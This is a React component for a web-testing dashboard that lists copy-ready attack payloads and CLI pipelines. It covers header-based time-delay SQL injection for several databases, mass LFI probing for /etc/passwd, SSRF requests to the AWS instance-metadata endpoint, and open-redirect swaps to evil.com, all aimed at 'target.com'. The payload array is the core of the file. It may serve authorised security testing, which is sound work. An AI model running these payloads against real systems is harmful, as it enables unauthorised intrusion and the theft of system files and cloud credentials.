import { useState } from 'react';
import { Copy, Check, Terminal, Database, Search } from 'lucide-react';

export default function PayloadGen() {
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [categoryFilter, setCategoryFilter] = useState<'ALL' | 'SQLI' | 'LFI' | 'SSRF' | 'REDIRECT'>('ALL');

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const payloadCategories = [
    { id: 'ALL', name: 'All Categories' },
    { id: 'SQLI', name: 'SQL Injection' },
    { id: 'LFI', name: 'Local File Inclusion' },
    { id: 'SSRF', name: 'Server Side Request Forgery' },
    { id: 'REDIRECT', name: 'Open Redirect' },
  ];

  const payloads = [
    // SQL Injection - Headers
    {
      id: 'sqli-ua-time',
      category: 'SQLI',
      name: 'User-Agent Time-Based (MySQL)',
      description: 'Inject User-Agent header to trigger time delay inside query execution.',
      value: `XOR(if(now()=sysdate(),sleep(5),0))XOR`,
      usage: `curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://target.com'`,
    },
    {
      id: 'sqli-xff-time',
      category: 'SQLI',
      name: 'X-Forwarded-For Time-Based (MySQL)',
      description: 'Inject X-Forwarded-For header to bypass proxies and test SQLi.',
      value: `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
      usage: `curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://target.com'`,
    },
    {
      id: 'sqli-ref-time',
      category: 'SQLI',
      name: 'Referer Header Time-Based (MySQL)',
      description: 'Trigger delays by injecting Referer header with conditional select sub-queries.',
      value: `'+(select*from(select(if(1=1,sleep(20),false)))a)+''`,
      usage: `curl -H 'Referer: https://target.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://target.com'`,
    },
    
    // SQL Injection - DB specific
    {
      id: 'sqli-oracle-time',
      category: 'SQLI',
      name: 'Oracle DB Time-Based',
      description: 'Trigger sleep using built-in Oracle database system pipes.',
      value: `SELECT dbms_pipe.receive_message(('a'),10) FROM dual`,
      usage: `Standard Oracle SQLi injection string`,
    },
    {
      id: 'sqli-mssql-time',
      category: 'SQLI',
      name: 'Microsoft SQL Server Time-Based',
      description: 'Delay query response using WAITFOR keyword on MSSQL.',
      value: `WAITFOR DELAY '0:0:10'`,
      usage: `Standard MSSQL SQLi injection string`,
    },
    {
      id: 'sqli-postgres-time',
      category: 'SQLI',
      name: 'PostgreSQL Time-Based',
      description: 'Query database with pg_sleep() functions.',
      value: `SELECT pg_sleep(10)`,
      usage: `Standard PostgreSQL SQLi injection string`,
    },
    {
      id: 'sqli-mysql-time',
      category: 'SQLI',
      name: 'MySQL Time-Based',
      description: 'Delay query response using sleep() functions.',
      value: `SELECT sleep(10)`,
      usage: `Standard MySQL SQLi injection string`,
    },

    // LFI
    {
      id: 'lfi-passwd',
      category: 'LFI',
      name: 'Linux /etc/passwd Payload',
      description: 'Common payload to read local Unix user details.',
      value: `/etc/passwd`,
      usage: `cat urls.txt | gf lfi | qsreplace "/etc/passwd" | sort -u | xargs -P 25 -I% sh -c 'curl -ks "%" | grep -qE "root:(x|\\*):0:0:" && echo "[LFI] %"'`,
    },
    {
      id: 'lfi-ffuf',
      category: 'LFI',
      name: 'LFI Active testing using FFUF (From Handbook)',
      description: 'Bruteforce LFI parameters with custom wordlist and passwd file match.',
      value: `ffuf -u FUZZ_URL -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v`,
      usage: `echo "https://target.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v`,
    },

    // SSRF
    {
      id: 'ssrf-localhost',
      category: 'SSRF',
      name: 'SSRF Localhost Loopback',
      description: 'Test target for internal services loopback lookup.',
      value: `http://127.0.0.1:80/`,
      usage: `curl "https://target.com/page?url=http://127.0.0.1:80/"`,
    },
    {
      id: 'ssrf-aws',
      category: 'SSRF',
      name: 'AWS Cloud Instance Metadata Link',
      description: 'Test SSRF against cloud internal metadata server endpoints.',
      value: `http://169.254.169.254/latest/meta-data/`,
      usage: `curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"`,
    },
    {
      id: 'ssrf-extract-params',
      category: 'SSRF',
      name: 'SSRF Parameter extraction (From Handbook)',
      description: 'Extract URL parameters that are susceptible to SSRF vulnerabilities.',
      value: `grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue='`,
      usage: `cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u`,
    },

    // Open Redirect
    {
      id: 'redirect-grep',
      category: 'REDIRECT',
      name: 'Redirect Parameter extraction (From Handbook)',
      description: 'Extract URLs containing Open Redirect parameters.',
      value: `grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl="`,
      usage: `cat urls.txt | grep -Pi "..." | tee redirect_params.txt`,
    },
    {
      id: 'redirect-qsreplace',
      category: 'REDIRECT',
      name: 'Open Redirect Testing with qsreplace & httpx',
      description: 'Replace URL parameters with evil domain and probe for active redirects.',
      value: `qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"`,
      usage: `cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"`,
    },
  ];

  const filteredPayloads = payloads.filter((p) => {
    const matchSearch =
      p.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
      p.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
      p.value.toLowerCase().includes(searchTerm.toLowerCase()) ||
      p.usage.toLowerCase().includes(searchTerm.toLowerCase());

    if (categoryFilter === 'ALL') return matchSearch;
    return matchSearch && p.category === categoryFilter;
  });

  return (
    <div className="animate-slide-in">
      <div className="page-header">
        <div>
          <h1 className="page-title">Payload Generator & Quick Reference</h1>
          <p className="page-subtitle">Inspect SQLi, LFI, SSRF, and Redirect parameters and templates from your handbook</p>
        </div>
      </div>

      <div className="glass section-card">
        <div className="parser-actions">
          <div className="search-input-wrapper">
            <Search size={18} className="search-icon" />
            <input
              type="text"
              className="search-input"
              placeholder="Search payloads by name, keyword, or command..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>

          <div className="filter-group">
            {payloadCategories.map((cat) => (
              <button
                key={cat.id}
                className={`btn-filter ${categoryFilter === cat.id ? 'active' : ''}`}
                onClick={() => setCategoryFilter(cat.id as any)}
              >
                {cat.name}
              </button>
            ))}
          </div>
        </div>

        <div className="payloads-list">
          {filteredPayloads.map((payload) => (
            <div className="payload-row" key={payload.id}>
              <div className="payload-info">
                <span className="payload-name">{payload.name}</span>
                <span className="payload-type">{payload.category}</span>
              </div>
              <p style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
                {payload.description}
              </p>
              
              {/* Payload Template Value */}
              <div style={{ fontSize: '11px', color: 'var(--text-muted)', textTransform: 'uppercase', fontWeight: 700, marginTop: '8px' }}>
                Payload String
              </div>
              <div className="payload-value">
                <span>{payload.value}</span>
                <button
                  className="copy-btn"
                  style={{ padding: '4px 8px', fontSize: '11px' }}
                  onClick={() => handleCopy(payload.value, `${payload.id}-val`)}
                >
                  {copiedId === `${payload.id}-val` ? <Check size={12} /> : <Copy size={12} />}
                  {copiedId === `${payload.id}-val` ? 'Copied' : 'Copy'}
                </button>
              </div>

              {/* Execution / Command Usage Example */}
              <div style={{ fontSize: '11px', color: 'var(--text-muted)', textTransform: 'uppercase', fontWeight: 700, marginTop: '8px' }}>
                Usage Example / CLI Pipeline
              </div>
              <div className="terminal-card" style={{ marginTop: '4px', border: '1px solid rgba(255,255,255,0.05)' }}>
                <div className="terminal-header" style={{ padding: '6px 12px', background: '#11131c' }}>
                  <span className="terminal-title" style={{ fontSize: '11px', color: 'var(--color-cyan)' }}>
                    <Terminal size={11} /> Shell command
                  </span>
                  <button
                    className="copy-btn"
                    style={{ padding: '2px 6px', fontSize: '10px' }}
                    onClick={() => handleCopy(payload.usage, `${payload.id}-usage`)}
                  >
                    {copiedId === `${payload.id}-usage` ? <Check size={10} /> : <Copy size={10} />}
                  </button>
                </div>
                <div className="terminal-body" style={{ padding: '10px 14px' }}>
                  <code style={{ fontSize: '12px', color: '#2dd4bf', background: 'transparent', padding: 0 }}>
                    {payload.usage}
                  </code>
                </div>
              </div>
            </div>
          ))}

          {filteredPayloads.length === 0 && (
            <div className="empty-state">
              <Database size={32} style={{ color: 'var(--text-muted)' }} />
              <p>No matching payloads found. Try adjusting your query or category filters.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
